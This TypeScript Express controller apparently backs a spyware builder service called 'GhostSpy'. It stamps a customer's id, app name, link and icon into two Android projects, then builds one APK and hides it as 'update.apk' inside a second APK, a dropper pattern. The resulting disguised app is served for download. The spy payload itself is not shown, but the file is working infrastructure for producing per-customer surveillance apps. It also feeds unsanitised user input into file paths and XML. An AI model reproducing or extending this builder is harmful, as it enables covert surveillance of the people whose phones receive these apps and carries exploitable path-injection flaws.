import { Request, Response } from "express";
import { validationResult } from "express-validator";
import fs from "fs";
import path from "path";
import sharp from "sharp";
import { spawn } from "child_process";
import App from "../models/app.model";
import User from "../models/user.model";

// Define the paths to your batch files
const BAT_PATH = process.env.BAT_PATH as string;
const BAT01_PATH = process.env.BAT01_PATH as string;

// In-memory queue for APK creation requests
const apkBuildQueue: (() => Promise<void>)[] = [];
let isProcessing = false;

// Helper function to process the queue
const processQueue = async () => {
	if (isProcessing || apkBuildQueue.length === 0) return;

	isProcessing = true;

	const nextInQueue = apkBuildQueue.shift();
	if (nextInQueue) {
		try {
			await nextInQueue();
		} catch (error) {
			console.error("Error processing APK in queue:", error);
		} finally {
			isProcessing = false;
			processQueue(); // Process the next request in the queue
		}
	}
};

export const createNewApk = (req: Request, res: Response) => {
	// Check for validation errors
	const errors = validationResult(req);
	if (!errors.isEmpty()) {
		return res.status(400).json({ errors: errors.array() });
	}

	const { userId, appName, appUrl } = req.body;
	const appIcon = req.file; // Get the uploaded file

	// Define the user-specific folder
	const userFolderPath = path.join(
		__dirname,
		"../../public/downloads",
		userId
	);

	// Push the request into the queue
	apkBuildQueue.push(async () => {
		try {
			// Step 1: Replace the userId and appName in the strings.xml files
			const paths = [
				{
					name: "Ghost_main",
					filePath: path.join(
						__dirname,
						"../../public/GhostSpy/GhostSpy_main/app/src/main/res/values/strings.xml"
					),
				},
				{
					name: "Ghost_major",
					filePath: path.join(
						__dirname,
						"../../public/GhostSpy/GhostSpy_major/app/src/main/res/values/strings.xml"
					),
				},
			];

			for (const { filePath } of paths) {
				let fileContent = await fs.promises.readFile(filePath, "utf8");

				let newContent = fileContent.replace(
					/<string name="app_user_id" translatable="false">.*<\/string>/,
					`<string name="app_user_id" translatable="false">${userId}</string>`
				);

				newContent = newContent.replace(
					/<string name="app_name" translatable="false">.*<\/string>/,
					`<string name="app_name" translatable="false">${appName}</string>`
				);

				// Only update appUrl and app_link_enable in Ghost_main
				if (filePath.includes("GhostSpy_main")) {
					if (appUrl === "null") {
						newContent = newContent.replace(
							/<string name="app_link_enable" translatable="false">.*<\/string>/,
							`<string name="app_link_enable" translatable="false">${"disable"}</string>`
						);
					} else {
						newContent = newContent.replace(
							/<string name="app_link" translatable="false">.*<\/string>/,
							`<string name="app_link" translatable="false">${appUrl}</string>`
						);
						newContent = newContent.replace(
							/<string name="app_link_enable" translatable="false">.*<\/string>/,
							`<string name="app_link_enable" translatable="false">${"enable"}</string>`
						);
					}
				}

				await fs.promises.writeFile(filePath, newContent, "utf8");
			}

			// Step 2: Save and Resize the Uploaded Icon
			if (appIcon) {
				const iconPath = path.join(
					__dirname,
					"../../public/uploads",
					appIcon.filename
				);

				const sizes = {
					"mipmap-hdpi": 72,
					"mipmap-mdpi": 48,
					"mipmap-xhdpi": 96,
					"mipmap-xxhdpi": 144,
					"mipmap-xxxhdpi": 192,
				};

				const resizeAndSaveIcon = async (
					size: number,
					folder: string,
					basePath: string
				) => {
					const outputPath = path.join(basePath, folder);

					await fs.promises.mkdir(outputPath, { recursive: true });

					await sharp(iconPath)
						.resize(size, size)
						.toFile(path.join(outputPath, "ic_launcher.webp"));

					await sharp(iconPath)
						.resize(size, size)
						.toFile(
							path.join(outputPath, "ic_launcher_foreground.webp")
						);

					await sharp(iconPath)
						.resize(size, size)
						.toFile(
							path.join(outputPath, "ic_launcher_round.webp")
						);
				};

				for (const { filePath } of paths) {
					const basePath = path
						.dirname(filePath)
						.replace("values", "");
					await Promise.all(
						Object.entries(sizes).map(([folder, size]) =>
							resizeAndSaveIcon(size, folder, basePath)
						)
					);
				}
			}

			// Step 3: Build Ghost_main APK
			console.log(`Starting Ghost_main APK build process for ${appName}`);
			await buildApk(BAT_PATH);

			// Step 4: Create user-specific folder for saving APKs
			await fs.promises.mkdir(userFolderPath, { recursive: true });

			// Rename and move the APK
			const ghostMainApkPath = path.join(
				__dirname,
				"../../public/GhostSpy/GhostSpy_main/app/build/outputs/apk/debug/app-debug.apk"
			);

			const updateApkPath = path.join(
				__dirname,
				"../../public/GhostSpy/GhostSpy_major/app/src/main/assets/update.apk"
			);

			await fs.promises.rename(ghostMainApkPath, updateApkPath);

			// Step 4: Build Ghost_major APK
			console.log(
				`Starting Ghost_major APK build process for ${appName}`
			);
			await buildApk(BAT01_PATH);

			// Step 5: Make the APK available for download
			const ghostMajorApkPath = path.join(
				__dirname,
				"../../public/GhostSpy/GhostSpy_major/app/build/outputs/apk/debug/app-debug.apk"
			);

			const ghostMajorApkPublicPath = path.join(
				userFolderPath,
				`${appName}.apk`
			);

			const fileExists = await fs.promises
				.stat(ghostMajorApkPath)
				.catch(() => null);
			if (!fileExists || !fileExists.isFile()) {
				throw new Error("Ghost_major APK file was not created.");
			}

			await fs.promises.copyFile(
				ghostMajorApkPath,
				ghostMajorApkPublicPath
			);

			// Add new APK info to the App model
			await App.create({
				userId,
				name: appName,
				path: ghostMajorApkPublicPath,
			});

			// Update User model's apk field
			await User.findOneAndUpdate(
				{ _id: userId },
				{ apk: "created", apkName: appName }
			);

			res.status(200).json({ success: true });
		} catch (error) {
			console.error("Error processing APK:", error);
			res.status(500).json({ error: "Failed to process the APK" });
		}
	});

	// Start processing the queue if not already processing
	processQueue();
};

// Helper function to build APK
const buildApk = (batPath: string): Promise<void> => {
	return new Promise<void>((resolve, reject) => {
		const batProcess = spawn("cmd.exe", ["/c", batPath], {
			detached: true,
			stdio: "ignore",
		});

		batProcess.unref();

		batProcess.on("close", (code) => {
			if (code !== 0) {
				console.error(`APK build process exited with code ${code}`);
				return reject(new Error("Failed to build APK"));
			}
			resolve();
		});

		// For Ubuntu server
		// const shProcess = spawn("bash", [batPath], {
		// 	detached: true,
		// 	stdio: "ignore",
		// });

		// shProcess.unref();

		// shProcess.on("close", (code) => {
		// 	if (code !== 0) {
		// 		console.error(`APK build process exited with code ${code}`);
		// 		return reject(new Error("Failed to build APK"));
		// 	}
		// 	resolve();
		// });
	});
};

// Get New APK
export const getNewApk = async (req: Request, res: Response) => {
	// Check for validation errors
	const errors = validationResult(req);
	if (!errors.isEmpty()) {
		return res.status(400).json({ errors: errors.array() });
	}

	try {
		// Extract userId and appName from request parameters
		const { userId, apkName } = req.params;
		console.log(userId, apkName);
		// Check if both userId and appName are provided
		if (!userId || !apkName) {
			return res.status(400).json({ error: "Invalid userId or appName" });
		}

		// Construct the user-specific folder path
		const userFolderPath = path.join(
			__dirname,
			"../../public/downloads",
			userId
		);

		// Construct the full APK path inside the user folder
		const apkFilePath = path.join(userFolderPath, `${apkName}.apk`);

		// Log the file path for debugging
		console.log("APK File Path:", apkFilePath);

		// Check if the file exists
		if (!fs.existsSync(apkFilePath)) {
			return res.status(404).json({ error: "APK file not found" });
		}

		// Set headers and send the file
		res.setHeader(
			"Content-Type",
			"application/vnd.android.package-archive"
		);
		res.setHeader(
			"Content-Disposition",
			`attachment; filename="${apkName}.apk"`
		);

		// Stream the file to the client
		fs.createReadStream(apkFilePath).pipe(res);
	} catch (error) {
		console.error("Error processing APK:", error);
		res.status(500).json({ error: "Failed to process the APK" });
	}
};
